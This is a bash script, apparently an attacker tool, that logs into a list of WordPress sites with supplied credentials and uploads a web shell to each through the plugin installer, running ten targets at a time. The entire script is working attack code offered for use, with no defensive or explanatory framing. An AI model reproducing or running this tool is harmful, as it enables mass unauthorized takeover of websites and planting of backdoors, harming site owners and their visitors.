#!/bin/bash
#Coded By Con7ext
green='\e[92m'
blue='\e[34m'
red='\e[31m'
white='\e[39m'
BULAN=`date +%m`
TAHUN=`date +%Y`
USER_AGENT="Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:21.0) Gecko/20130331 Firefox/21.0"
COOKIE_LOG="/tmp/cookie-"`date +%s`
COOKIE_PATH="/tmp/cookies-"`date +%s`
THREAD=10
ekse(){
	curl -s -A "$USER_AGENT" -c "$COOKIE_PATH" $site/wp-login.php > /dev/null
	status=$(curl -s -c "$COOKIE_LOG" --write-out  %{http_code} -b "$COOKIE_PATH" -d "log=$user&pwd=$pass&wp-submit=Log+in&redirect_to=$site/wp-admin&testcookie=1" --url "$site/wp-login.php")
	if [[ $status == 302 ]]; 
	then
		printf "$green[+] $site Login Success\n"
		printf "$blue[!] Trying To Upload Shell\n"
		mek=`curl -s -b "$COOKIE_LOG" --url "$site/wp-admin/plugin-install.php" | grep -Po '(?<=name="_wpnonce" value=")[^"]*()'`
		mik=`curl -s -b "$COOKIE_LOG" --url "$site/wp-admin/plugin-install.php" | grep -Po '(?<=name="_wp_http_referer" value=")[^"]*()'`
		ups=`curl -s -b "$COOKIE_LOG" -F "_wpnonce=$mek" -F "_wp_http_referer=$mik" -F "pluginzip=@$shell" -F "install-plugin-submit=Install+Now" --url "$site/wp-admin/update.php?action=upload-plugin" -L`
		if [[ "$ups" =~ "Installing Plugin from uploaded file" ]];
		then
			printf "$green[+] Upload Shell Success ...$blue $site/wp-content/uploads/$TAHUN/$BULAN/$shell $white\n"
			rm "$COOKIE_LOG" 2> /dev/null
		else
			printf "$red[-] Upload Shell Failed ... Try Manual $white\n"
			rm "$COOKIE_LOG" 2> /dev/null
		fi
	else
	echo "[-] $site"
	printf "$red[-] Login Failed$white\n"
	fi
	rm "$COOKIE_PATH" 2> /dev/null
}
read -p "List : " list
read -p "User : " user
read -p "Pass : " pass
read -p "Shell: " shell
for site in `cat $list`;
do
  ((cthread=cthread%THREAD)); ((cthread++==0)) && wait
	ekse $site &
done
wait
